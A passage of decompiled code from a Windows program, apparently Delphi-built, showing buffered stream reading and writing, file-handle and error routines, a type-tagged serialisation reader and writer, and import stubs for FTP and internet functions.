  FUN_00403520(**(int **)(param_4 + -4),local_10c);
  local_c = local_10c;
  local_8 = 4;
  iVar1 = FUN_0040a9f0((int)PTR_DAT_0040f7d4,'\x01',(int **)PTR_PTR_DAT_004186cc,0,&local_c);
  FUN_00403abc(iVar1);
  return;
}



void FUN_00411fbc(int *param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  int *piVar2;
  
  if (param_3 != 0) {
    iVar1 = (**(code **)(*param_1 + 0xc))(param_1,param_2,param_3);
    if (param_3 != iVar1) {
      piVar2 = FUN_0040a9b4((int *)PTR_DAT_0040f99c,'\x01',(int **)PTR_PTR_DAT_0041869c);
      FUN_00403abc((int)piVar2);
    }
  }
  return;
}



void FUN_00411ff4(int *param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  int *piVar2;
  
  if (param_3 != 0) {
    iVar1 = (**(code **)(*param_1 + 0x10))(param_1,param_2,param_3);
    if (param_3 != iVar1) {
      piVar2 = FUN_0040a9b4((int *)PTR_DAT_0040f9f4,'\x01',(int **)PTR_LAB_004185d8);
      FUN_00403abc((int)piVar2);
    }
  }
  return;
}



void FUN_0041202c(int *param_1,int *param_2,undefined4 param_3,uint param_4,int param_5)

{
  int iVar1;
  int extraout_EDX;
  uint uVar2;
  undefined4 *in_FS_OFFSET;
  bool bVar3;
  undefined4 uStackY_34;
  uint local_18;
  
  if ((param_5 == 0) && (param_4 == 0)) {
    uStackY_34 = 0x412051;
    FUN_00411dc4(param_2,param_2,param_3,0,0);
    param_4 = (**(code **)*param_2)();
    param_5 = extraout_EDX;
  }
  if (param_5 == 0) {
    if (param_4 < 0xf001) {
LAB_00412085:
      local_18 = param_4;
      goto LAB_0041208b;
    }
  }
  else if (param_5 < 1) goto LAB_00412085;
  local_18 = 0xf000;
LAB_0041208b:
  iVar1 = FUN_00402690(local_18);
  uStackY_34 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY_34;
  do {
    if ((param_5 == 0) && (param_4 == 0)) {
      *in_FS_OFFSET = uStackY_34;
      FUN_004026b0(iVar1);
      return;
    }
    uVar2 = local_18;
    if ((int)local_18 >> 0x1f == param_5) {
      if (param_4 <= local_18) {
LAB_004120bd:
        uVar2 = param_4;
      }
    }
    else if (param_5 <= (int)local_18 >> 0x1f) goto LAB_004120bd;
    FUN_00411fbc(param_2,iVar1,uVar2);
    FUN_00411ff4(param_1,iVar1,uVar2);
    bVar3 = param_4 < uVar2;
    param_4 = param_4 - uVar2;
    param_5 = (param_5 - ((int)uVar2 >> 0x1f)) - (uint)bVar3;
  } while( true );
}



int * FUN_00412120(int *param_1,char param_2,int param_3)

{
  int extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403578(param_1,'\0',param_3);
  param_1[1] = param_3;
  if (param_2 != '\0') {
    FUN_00403848(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_004121bc(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  BOOL BVar1;
  
  (**(code **)(*param_1 + 0x18))(param_1,0,*param_1,param_4,param_5);
  BVar1 = SetEndOfFile((HANDLE)param_1[1]);
  FUN_0040bc50(BVar1);
  return;
}



int * FUN_004121e4(int *param_1,char param_2,undefined *param_3,ushort param_4)

{
  undefined *extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar1;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  uVar1 = 0;
  FUN_00412228(param_1,'\0',param_3,0,param_4);
  if (param_2 != '\0') {
    FUN_00403848(param_1);
    *in_FS_OFFSET = uVar1;
  }
  return param_1;
}



void FUN_00412228(int *param_1,char param_2,undefined *param_3,undefined4 param_4,ushort param_5)

{
  int iVar1;
  DWORD DVar2;
  HANDLE pvVar3;
  undefined *extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffa8;
  undefined *puStack_50;
  undefined *puStack_4c;
  undefined *puStack_48;
  undefined4 in_stack_ffffffbc;
  undefined4 in_stack_ffffffc0;
  undefined4 in_stack_ffffffc4;
  undefined4 in_stack_ffffffc8;
  int local_28;
  int local_24;
  int local_20;
  int local_1c;
  int local_18;
  undefined local_14;
  int local_10;
  undefined local_c;
  char local_5;
  
  local_24 = 0;
  local_28 = 0;
  local_1c = 0;
  local_20 = 0;
  if (param_2 != '\0') {
    puStack_48 = (undefined *)0x41224b;
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_ffffffbc,in_stack_ffffffc0,
                                  in_stack_ffffffc4,in_stack_ffffffc8);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  puStack_4c = &LAB_00412351;
  puStack_50 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_50;
  local_5 = param_2;
  if (param_5 == 0xffff) {
    puStack_48 = &stack0xfffffffc;
    iVar1 = FUN_00407600(param_3);
    FUN_00412120(param_1,'\0',iVar1);
    if (param_1[1] < 0) {
      FUN_00407940(param_3,&local_1c);
      local_18 = local_1c;
      local_14 = 0xb;
      DVar2 = GetLastError();
      FUN_0040a0f0(DVar2,&local_20);
      local_10 = local_20;
      local_c = 0xb;
      in_stack_ffffffa8 = 1;
      iVar1 = FUN_0040a9f0((int)PTR_DAT_0040f890,'\x01',(int **)PTR_PTR_DAT_004186e8,1,&local_18);
      FUN_00403abc(iVar1);
    }
  }
  else {
    puStack_48 = &stack0xfffffffc;
    pvVar3 = FUN_00407584(param_3,(uint)param_5);
    FUN_00412120(param_1,'\0',(int)pvVar3);
    if (param_1[1] < 0) {
      FUN_00407940(param_3,&local_24);
      local_18 = local_24;
      local_14 = 0xb;
      DVar2 = GetLastError();
      FUN_0040a0f0(DVar2,&local_28);
      local_10 = local_28;
      local_c = 0xb;
      in_stack_ffffffa8 = 1;
      iVar1 = FUN_0040a9f0((int)PTR_DAT_0040f8ec,'\x01',(int **)PTR_PTR_DAT_004184e0,1,&local_18);
      FUN_00403abc(iVar1);
    }
  }
  *in_FS_OFFSET = in_stack_ffffffa8;
  puStack_50 = &LAB_00412358;
  FUN_00404080(&local_28,4);
  return;
}



void FUN_004123b0(int param_1,undefined4 param_2,undefined4 param_3)

{
  *(undefined4 *)(param_1 + 4) = param_2;
  *(undefined4 *)(param_1 + 8) = param_3;
  return;
}



uint FUN_004123b8(int param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = *(int *)(param_1 + 0xc);
  if (((iVar1 < 0) || ((int)param_3 < 0)) || (uVar2 = *(int *)(param_1 + 8) - iVar1, (int)uVar2 < 1)
     ) {
    uVar2 = 0;
  }
  else {
    if ((int)param_3 < (int)uVar2) {
      uVar2 = param_3;
    }
    FUN_00402890((undefined4 *)(*(int *)(param_1 + 4) + iVar1),param_2,uVar2);
    *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + uVar2;
  }
  return uVar2;
}



void FUN_00412440(int *param_1)

{
  FUN_00412458(param_1,0);
  param_1[2] = 0;
  param_1[3] = 0;
  return;
}



void FUN_00412458(int *param_1,int param_2)

{
  undefined4 uVar1;
  int local_8;
  
  local_8 = param_2;
  uVar1 = (**(code **)(*param_1 + 0x1c))(param_1,&local_8);
  FUN_004123b0((int)param_1,uVar1,param_1[2]);
  param_1[4] = local_8;
  return;
}



LPCVOID FUN_004124ac(int param_1,SIZE_T *param_2)

{
  int *piVar1;
  LPCVOID pvVar2;
  LPCVOID extraout_ECX;
  
  if ((0 < (int)*param_2) && (*param_2 != *(SIZE_T *)(param_1 + 8))) {
    *param_2 = *param_2 + 0x1fff & 0xffffe000;
  }
  pvVar2 = *(LPCVOID *)(param_1 + 4);
  if (*param_2 != *(SIZE_T *)(param_1 + 0x10)) {
    if (*param_2 == 0) {
      FUN_004060a0(pvVar2);
      pvVar2 = (LPCVOID)0x0;
    }
    else {
      if (*(SIZE_T *)(param_1 + 0x10) == 0) {
        pvVar2 = (LPCVOID)FUN_00406074((uint)*(ushort *)PTR_DAT_00418680,*param_2);
      }
      else {
        pvVar2 = (LPCVOID)FUN_00406084(pvVar2,*param_2,(uint)*(ushort *)PTR_DAT_00418680);
      }
      if (pvVar2 == (LPCVOID)0x0) {
        piVar1 = FUN_0040a9b4((int *)PTR_DAT_0040f7d4,'\x01',(int **)PTR_PTR_DAT_004186bc);
        FUN_00403abc((int)piVar1);
        pvVar2 = extraout_ECX;
      }
    }
  }
  return pvVar2;
}



void FUN_00412588(int param_1,char *param_2)

{
  int *piVar1;
  int *piVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_24;
  undefined *puStack_20;
  undefined *puStack_1c;
  
  if (DAT_0041985c == 0) {
    return;
  }
  puStack_1c = (undefined *)0x4125ae;
  piVar1 = (int *)FUN_0041081c(DAT_0041985c);
  puStack_20 = &LAB_00412623;
  uStack_24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_24;
  iVar4 = piVar1[2] + -1;
  puStack_1c = &stack0xfffffffc;
  if (-1 < iVar4) {
    do {
      piVar2 = (int *)FUN_00410640(piVar1,iVar4);
      if ((param_1 == 0) || (piVar2[2] == param_1)) {
        if (param_2 != (char *)0x0) {
          uVar3 = FUN_00407114(param_2,(char *)piVar2[4]);
          if ((char)uVar3 == '\0') goto LAB_00412605;
        }
        FUN_00410550(piVar1,iVar4);
        FUN_004035a8(piVar2);
      }
LAB_00412605:
      iVar4 = iVar4 + -1;
    } while (iVar4 != -1);
  }
  *in_FS_OFFSET = uStack_24;
  puStack_1c = (undefined *)0x41262a;
  puStack_20 = (undefined *)0x412622;
  FUN_00410830(DAT_0041985c);
  return;
}



void FUN_00412634(int param_1)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_20;
  undefined *puStack_1c;
  undefined *puStack_18;
  
  if (DAT_0041985c != 0) {
    puStack_18 = (undefined *)0x412651;
    piVar1 = (int *)FUN_0041081c(DAT_0041985c);
    puStack_1c = &LAB_004126ab;
    uStack_20 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack_20;
    iVar3 = piVar1[2] + -1;
    puStack_18 = &stack0xfffffffc;
    if (-1 < iVar3) {
      do {
        piVar2 = (int *)FUN_00410640(piVar1,iVar3);
        if (piVar2[1] == param_1) {
          FUN_00410550(piVar1,iVar3);
          FUN_004035a8(piVar2);
        }
        iVar3 = iVar3 + -1;
      } while (iVar3 != -1);
    }
    *in_FS_OFFSET = uStack_20;
    puStack_18 = (undefined *)0x4126b2;
    puStack_1c = (undefined *)0x4126aa;
    FUN_00410830(DAT_0041985c);
    return;
  }
  return;
}



void FUN_004126b8(int **param_1)

{
  int *piVar1;
  
  piVar1 = FUN_0040a9b4((int *)PTR_DAT_0040f99c,'\x01',param_1);
  FUN_00403abc((int)piVar1);
  return;
}



void FUN_004126d0(void)

{
  FUN_004126b8((int **)PTR_PTR_DAT_00418620);
  return;
}



void FUN_004126dc(int param_1,undefined4 param_2,uint param_3)

{
  uint uVar1;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  
  uVar1 = FUN_00412998(param_1,param_2,param_3);
  if ((char)param_2 != (char)uVar1) {
    *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + -1;
    FUN_00412aa8(param_1,extraout_EDX,extraout_ECX);
    FUN_004126d0();
  }
  return;
}



bool FUN_00412700(int param_1,undefined4 param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = FUN_00412998(param_1,param_2,param_3);
  *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + -1;
  return (char)uVar1 == '\0';
}



void FUN_00412714(int param_1,undefined4 param_2,uint param_3)

{
  FUN_00412998(param_1,param_2,param_3);
  *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + -1;
  return;
}



void FUN_00412724(int param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  while (param_3 != 0) {
    uVar2 = *(uint *)(param_1 + 0x14) - *(uint *)(param_1 + 0x10);
    if (*(uint *)(param_1 + 0x14) < *(uint *)(param_1 + 0x10) || uVar2 == 0) {
      FUN_00412770(param_1);
      uVar2 = *(uint *)(param_1 + 0x14);
    }
    if (param_3 <= uVar2) {
      uVar2 = param_3;
    }
    param_3 = param_3 - uVar2;
    iVar1 = *(int *)(param_1 + 0x10);
    *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + uVar2;
    puVar4 = (undefined4 *)(*(int *)(param_1 + 8) + iVar1);
    for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *param_2 = *puVar4;
      puVar4 = puVar4 + 1;
      param_2 = param_2 + 1;
    }
    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined *)param_2 = *(undefined *)puVar4;
      puVar4 = (undefined4 *)((int)puVar4 + 1);
      param_2 = (undefined4 *)((int)param_2 + 1);
    }
  }
  return;
}



void FUN_00412770(int param_1)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = (**(code **)(**(int **)(param_1 + 4) + 0xc))
                    (*(int **)(param_1 + 4),*(undefined4 *)(param_1 + 8),
                     *(undefined4 *)(param_1 + 0xc));
  *(int *)(param_1 + 0x14) = iVar1;
  if (iVar1 == 0) {
    piVar2 = FUN_0040a9b4((int *)PTR_DAT_0040f99c,'\x01',(int **)PTR_PTR_DAT_0041869c);
    FUN_00403abc((int)piVar2);
  }
  *(undefined4 *)(param_1 + 0x10) = 0;
  return;
}



void FUN_004127ac(int param_1,undefined4 param_2,uint param_3)

{
  FUN_004126dc(param_1,CONCAT31((int3)((uint)param_2 >> 8),1),param_3);
  return;
}



void FUN_004127b4(int param_1)

{
  uint in_ECX;
  
  FUN_004126dc(param_1,0,in_ECX);
  return;
}



void FUN_004127bc(int param_1,int *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint local_c;
  
  local_c = param_3;
  FUN_00412724(param_1,&local_c,1);
  FUN_0040414c(param_2,(undefined4 *)0x0,local_c & 0xff);
  puVar1 = (undefined4 *)thunk_FUN_00404504(param_2);
  FUN_00412724(param_1,puVar1,local_c & 0xff);
  return;
}



void FUN_004127f8(int param_1,LPSTR *param_2)

{
  char cVar1;
  uint uVar2;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_20;
  undefined *puStack_1c;
  undefined *puStack_18;
  LPCWSTR local_c;
  uint local_8;
  
  puStack_18 = &stack0xfffffffc;
  local_c = (LPCWSTR)0x0;
  puStack_1c = &LAB_004128a5;
  uStack_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_20;
  cVar1 = FUN_00412714(param_1,param_2,0);
  if ((cVar1 == '\x12') || (cVar1 == '\x14')) {
    FUN_004128b4(param_1,&local_c,extraout_ECX);
    FUN_004042e4(param_2,local_c);
  }
  else {
    local_8 = 0;
    uVar2 = FUN_00412998(param_1,extraout_EDX,extraout_ECX);
    if ((char)uVar2 == '\x06') {
      FUN_00412724(param_1,&local_8,1);
    }
    else if ((char)uVar2 == '\f') {
      FUN_00412724(param_1,&local_8,4);
    }
    else {
      FUN_004126d0();
    }
    FUN_00404628((int *)param_2,local_8);
    FUN_00412724(param_1,(undefined4 *)*param_2,local_8);
  }
  *in_FS_OFFSET = uStack_20;
  puStack_18 = &LAB_004128ac;
  puStack_1c = (undefined *)0x4128a4;
  FUN_004046e4(&local_c);
  return;
}



void FUN_004128b4(int param_1,BSTR *param_2,uint param_3)

{
  char cVar1;
  uint uVar2;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_24;
  undefined *puStack_20;
  undefined *puStack_1c;
  LPCSTR local_10;
  undefined4 *local_c;
  UINT local_8;
  
  puStack_1c = &stack0xfffffffc;
  local_8 = 0;
  local_c = (undefined4 *)0x0;
  local_10 = (LPCSTR)0x0;
  puStack_20 = &LAB_0041298b;
  uStack_24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_24;
  cVar1 = FUN_00412714(param_1,param_2,param_3);
  if ((cVar1 == '\x06') || (cVar1 == '\f')) {
    FUN_004127f8(param_1,&local_10);
    FUN_00404830(param_2,local_10);
  }
  else {
    local_8 = 0;
    uVar2 = FUN_00412998(param_1,extraout_EDX,extraout_ECX);
    if ((char)uVar2 == '\x12') {
      FUN_00412724(param_1,&local_8,4);
      FUN_0040492c(param_2,local_8);
      FUN_00412724(param_1,(undefined4 *)*param_2,local_8 * 2);
    }
    else if ((char)uVar2 == '\x14') {
      FUN_00412724(param_1,&local_8,4);
      FUN_00404628((int *)&local_c,local_8);
      FUN_00412724(param_1,local_c,local_8);
      FUN_004059cc((undefined *)local_c,param_2);
    }
    else {
      FUN_004126d0();
    }
  }
  *in_FS_OFFSET = uStack_24;
  puStack_1c = &LAB_00412992;
  puStack_20 = (undefined *)0x412982;
  FUN_0040405c((int *)&local_10);
  puStack_20 = (undefined *)0x41298a;
  FUN_0040405c((int *)&local_c);
  return;
}



uint FUN_00412998(int param_1,undefined4 param_2,uint param_3)

{
  undefined4 uVar1;
  uint local_4;
  
  local_4 = param_3;
  uVar1 = FUN_00412724(param_1,&local_4,1);
  return CONCAT31((int3)((uint)uVar1 >> 8),(undefined)local_4);
}



void FUN_004129ac(int param_1,undefined4 param_2,uint param_3)

{
  uint extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  int local_8;
  
  puStack_10 = &stack0xfffffffc;
  local_8 = 0;
  puStack_14 = &LAB_004129e8;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  do {
    FUN_004127bc(param_1,&local_8,param_3);
    param_3 = extraout_ECX;
  } while (local_8 != 0);
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_004129ef;
  puStack_14 = (undefined *)0x4129e7;
  FUN_0040405c(&local_8);
  return;
}



void FUN_004129f4(undefined4 param_1,undefined4 param_2,uint param_3,int param_4)

{
  bool bVar1;
  uint extraout_ECX;
  uint extraout_ECX_00;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  int *piVar2;
  
  piVar2 = (int *)(param_4 + -4);
  while( true ) {
    bVar1 = FUN_00412700(*piVar2,param_2,param_3);
    if (bVar1) break;
    FUN_00412aa8(*piVar2,extraout_EDX_00,extraout_ECX_00);
    param_3 = extraout_ECX;
    param_2 = extraout_EDX;
  }
  FUN_004127b4(*piVar2);
  return;
}



void FUN_00412a1c(int param_1,undefined4 param_2,int param_3,int param_4)

{
  int local_8;
  
  local_8 = param_3;
  FUN_00412724(*(int *)(param_4 + -4),&local_8,4);
  FUN_00412c8c(*(int *)(param_4 + -4),local_8 * param_1);
  return;
}



void FUN_00412a4c(undefined4 param_1,undefined4 param_2,uint param_3,int param_4)

{
  char cVar1;
  bool bVar2;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar3;
  uint extraout_ECX_02;
  uint extraout_ECX_03;
  uint extraout_ECX_04;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar4;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  int *piVar5;
  
  piVar5 = (int *)(param_4 + -4);
  while( true ) {
    bVar2 = FUN_00412700(*piVar5,param_2,param_3);
    if (bVar2) break;
    cVar1 = FUN_00412714(*piVar5,extraout_EDX_04,extraout_ECX_04);
    if ((byte)(cVar1 - 2U) < 3) {
      FUN_00412aa8(*piVar5,extraout_EDX,extraout_ECX);
    }
    FUN_00412c8c(*piVar5,1);
    uVar3 = extraout_ECX_00;
    uVar4 = extraout_EDX_00;
    while( true ) {
      bVar2 = FUN_00412700(*piVar5,uVar4,uVar3);
      if (bVar2) break;
      FUN_00412c44(*piVar5,extraout_EDX_02,extraout_ECX_02);
      uVar3 = extraout_ECX_01;
      uVar4 = extraout_EDX_01;
    }
    FUN_004127b4(*piVar5);
    param_3 = extraout_ECX_03;
    param_2 = extraout_EDX_03;
  }
  FUN_004127b4(*piVar5);
  return;
}



void FUN_00412aa8(int param_1,undefined4 param_2,uint param_3)

{
  uint uVar1;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  int local_c;
  int local_8;
  
  puStack_10 = &stack0xfffffffc;
  local_c = 0;
  puStack_14 = &LAB_00412c37;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  local_8 = param_1;
  uVar1 = FUN_00412998(param_1,0,param_3);
  uVar1 = uVar1 & 0x7f;
  switch(uVar1) {
  case 1:
    FUN_004129f4(uVar1,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
    break;
  case 2:
    FUN_00412c8c(local_8,1);
    break;
  case 3:
    FUN_00412c8c(local_8,2);
    break;
  case 4:
    FUN_00412c8c(local_8,4);
    break;
  case 5:
    FUN_00412c8c(local_8,10);
    break;
  case 6:
  case 7:
    FUN_004127bc(local_8,&local_c,extraout_ECX);
    break;
  case 10:
    FUN_00412a1c(1,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
    break;
  case 0xb:
    FUN_004129ac(local_8,extraout_EDX,extraout_ECX);
    break;
  case 0xc:
    FUN_00412a1c(1,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
    break;
  case 0xe:
    FUN_00412a4c(uVar1,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
    break;
  case 0xf:
    FUN_00412c8c(local_8,4);
    break;
  case 0x10:
    FUN_00412c8c(local_8,8);
    break;
  case 0x11:
    FUN_00412c8c(local_8,8);
    break;
  case 0x12:
    FUN_00412a1c(2,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
    break;
  case 0x13:
    FUN_00412c8c(local_8,8);
    break;
  case 0x14:
    FUN_00412a1c(1,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
  }
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_00412c3e;
  puStack_14 = (undefined *)0x412c36;
  FUN_0040405c(&local_c);
  return;
}



void FUN_00412c44(int param_1,undefined4 param_2,uint param_3)

{
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  int local_8;
  
  puStack_10 = &stack0xfffffffc;
  local_8 = 0;
  puStack_14 = &LAB_00412c81;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  FUN_004127bc(param_1,&local_8,param_3);
  FUN_00412aa8(param_1,extraout_EDX,extraout_ECX);
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_00412c88;
  puStack_14 = (undefined *)0x412c80;
  FUN_0040405c(&local_8);
  return;
}



void FUN_00412c8c(int param_1,uint param_2)

{
  undefined4 auStack_108 [64];
  
  if (0 < (int)param_2) {
    do {
      if ((int)param_2 < 0x101) {
        FUN_00412724(param_1,auStack_108,param_2);
        param_2 = 0;
      }
      else {
        FUN_00412724(param_1,auStack_108,0x100);
        param_2 = param_2 - 0x100;
      }
    } while (0 < (int)param_2);
  }
  return;
}



void FUN_00412cd4(int param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  while (param_3 != 0) {
    uVar2 = *(uint *)(param_1 + 0xc) - *(uint *)(param_1 + 0x10);
    if (*(uint *)(param_1 + 0xc) < *(uint *)(param_1 + 0x10) || uVar2 == 0) {
      FUN_00412d20(param_1);
      uVar2 = *(uint *)(param_1 + 0xc);
    }
    if (param_3 <= uVar2) {
      uVar2 = param_3;
    }
    param_3 = param_3 - uVar2;
    iVar1 = *(int *)(param_1 + 0x10);
    *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + uVar2;
    puVar4 = (undefined4 *)(*(int *)(param_1 + 8) + iVar1);
    for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar4 = *param_2;
      param_2 = param_2 + 1;
      puVar4 = puVar4 + 1;
    }
    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined *)puVar4 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      puVar4 = (undefined4 *)((int)puVar4 + 1);
    }
  }
  return;
}



void FUN_00412d20(int param_1)

{
  FUN_00411ff4(*(int **)(param_1 + 4),*(undefined4 *)(param_1 + 8),*(int *)(param_1 + 0x10));
  *(undefined4 *)(param_1 + 0x10) = 0;
  return;
}



void FUN_00412d38(int param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_00412e34(param_1,1,param_3);
  return;
}



void FUN_00412d40(int param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_00412e34(param_1,0,param_3);
  return;
}



void FUN_00412d48(int param_1,uint *param_2,uint *param_3)

{
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined in_ZF;
  uint *local_10;
  
  local_10 = param_3;
  FUN_00404444(param_2,param_3);
  if ((bool)in_ZF) {
    local_10 = (uint *)FUN_004042f8((int)param_2);
    if ((int)local_10 < 0x100) {
      FUN_00412e34(param_1,6,extraout_ECX_00);
      FUN_00412cd4(param_1,&local_10,1);
    }
    else {
      FUN_00412e34(param_1,0xc,extraout_ECX_00);
      FUN_00412cd4(param_1,&local_10,4);
    }
    FUN_00412cd4(param_1,param_2,(uint)local_10);
  }
  else {
    local_10 = (uint *)FUN_004042f8((int)param_3);
    FUN_00412e34(param_1,0x14,extraout_ECX);
    FUN_00412cd4(param_1,&local_10,4);
    FUN_00412cd4(param_1,param_3,(uint)local_10);
  }
  return;
}



void FUN_00412de0(int param_1,uint *param_2)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  uint *local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_8 = (uint *)0x0;
  puStack_18 = &LAB_00412e25;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  FUN_00405a70((LPCSTR)param_2,(int *)&local_8);
  FUN_00412d48(param_1,param_2,local_8);
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_00412e2c;
  puStack_18 = (undefined *)0x412e24;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_00412e34(int param_1,undefined param_2,undefined4 param_3)

{
  undefined4 local_4;
  
  local_4 = CONCAT31((int3)((uint)param_3 >> 8),param_2);
  FUN_00412cd4(param_1,&local_4,1);
  return;
}



void FUN_00412e48(void)

{
  InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_00419860);
  DAT_00419848 = CreateEventA((LPSECURITY_ATTRIBUTES)0x0,-1,0,&DAT_00412e78);
  if (DAT_00419848 == (HANDLE)0x0) {
    FUN_0040bbb4();
  }
  return;
}



void FUN_00412e7c(void)

{
  DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_00419860);
  CloseHandle(DAT_00419848);
  return;
}



void FUN_00412e94(void)

{
  undefined4 *puVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  
  puStack_14 = (undefined *)0x412ea4;
  puVar1 = (undefined4 *)FUN_0041081c(DAT_00419850);
  puStack_18 = &LAB_00412ee9;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  iVar3 = puVar1[2];
  if (-1 < iVar3 + -1) {
    iVar4 = 0;
    puStack_14 = &stack0xfffffffc;
    do {
      piVar2 = (int *)FUN_00410640(puVar1,iVar4);
      FUN_004035a8(piVar2);
      iVar4 = iVar4 + 1;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
  }
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_00412ef0;
  puStack_18 = (undefined *)0x412ee8;
  FUN_00410830(DAT_00419850);
  return;
}



void FtpFindFirstFileA(void)

{
                    // WARNING: Could not recover jumptable at 0x0041304c. Too many branches
                    // WARNING: Treating indirect jump as call
  FtpFindFirstFileA();
  return;
}



void FtpGetFileA(void)

{
                    // WARNING: Could not recover jumptable at 0x00413054. Too many branches
                    // WARNING: Treating indirect jump as call
  FtpGetFileA();
  return;
}



void InternetCloseHandle(void)

{
                    // WARNING: Could not recover jumptable at 0x0041305c. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetCloseHandle();
  return;
}



void InternetConnectA(void)

{
                    // WARNING: Could not recover jumptable at 0x00413064. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetConnectA();
  return;
}



void InternetOpenA(void)

{
